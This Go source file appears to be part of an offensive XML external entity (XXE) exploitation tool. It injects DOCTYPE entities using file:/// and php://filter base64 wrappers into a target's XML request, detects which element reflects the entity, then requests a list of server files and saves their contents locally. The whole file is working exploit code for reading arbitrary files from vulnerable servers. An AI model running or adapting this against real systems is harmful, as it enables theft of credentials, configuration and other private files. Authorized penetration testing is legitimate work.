package xxe

import (
	"bytes"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"regexp"

	str "strings"
)

// todo: try entities from /usr/share/seclists/Fuzzing/XXE-Fuzzing.txt
// todo: add hacktricks/pentesting-web/xxe-xee-xml-external-entity.md

func (p *ParamsT) DirectTest() error {
	fmt.Println("testing...")

	fmtStr := make(map[string]string)
	fmtStr["file"] = `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
	fmtStr["filter"] = `<!DOCTYPE root [<!ENTITY ext SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=file:///%s"> ]>`

	leafName, fmtStrKey, err := p.DirectDetectLeaf(fmtStr)
	if err != nil {
		return err
	}

	if leafName == "" || fmtStrKey == "" {
		return fmt.Errorf("can't find direct XXE injection")
	}

	for _, file := range p.Files {
		fileQuoted := str.Replace(file, " ", "&#x20;", -1)
		entity := fmt.Sprintf(fmtStr[fmtStrKey], fileQuoted)
		reqXml := str.Replace(p.XmlData, "?>", "?>"+entity, 1)

		content, err := p.getFile(reqXml, leafName)
		if err != nil {
			return err
		}

		if content != "" {
			locFile := makeLocalPath(p.OutDir, file)

			var contentBin []byte
			if fmtStrKey == "file" {
				contentBin = []byte(content)
			} else if fmtStrKey == "filter" {
				contentBin, err = defilter(content)
				if err != nil {
					locFile += ".zip"
				}
			}

			err = ioutil.WriteFile(locFile, contentBin, 0640)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func (p *ParamsT) DirectDetectLeaf(fmtStr map[string]string) (string, string, error) {
	var n NodeT
	err := p.XmlDecoder.Decode(&n)
	if err != nil {
		return "", "", err
	}

	var leafs []LeafT
	walkNodes([]NodeT{n}, func(n NodeT) bool {
		decTest := xml.NewDecoder(bytes.NewBuffer(n.Content))
		var nTest NodeT
		err = decTest.Decode(&nTest)
		if err != nil {
			leaf := LeafT{Name: n.XMLName.Local,
				Value: string(n.Content)}
			leafs = append(leafs, leaf)
		}

		return true
	})

	for _, file := range p.Files {
		file = str.Replace(file, " ", "&#x20;", -1)

		entityFilter := fmt.Sprintf(fmtStr["filter"], file)
		entityFile := fmt.Sprintf(fmtStr["file"], file)

		xmlFilter := str.Replace(p.XmlData, "?>", "?>"+entityFilter, 1)
		xmlFile := str.Replace(p.XmlData, "?>", "?>"+entityFile, 1)

		for _, leaf := range leafs {
			content, err := p.getFile(xmlFilter, leaf.Name)
			if err != nil {
				return "", "", err
			}

			if content != "" {
				return leaf.Name, "filter", nil
			}

			content, err = p.getFile(xmlFile, leaf.Name)
			if err != nil {
				return "", "", err
			}

			if content != "" {
				return leaf.Name, "file", nil
			}
		}
	}

	return "", "", nil
}

func (p *ParamsT) getFile(reqXml, leafName string) (string, error) {
	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
	re := regexp.MustCompile(exp)

	sep := str.Repeat("-=x=", 15) + "-"
	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
	reqXmlMod := re.ReplaceAllString(reqXml, replStr)

	body, err := makeRequest(p.Url, reqXmlMod, p.Cookie, p.OutDir)
	if err != nil {
		return "", err
	}
	if str.Contains(body, sep) {
		bodyFields := str.Split(body, sep)
		return bodyFields[1], nil
	}
	return "", nil
}
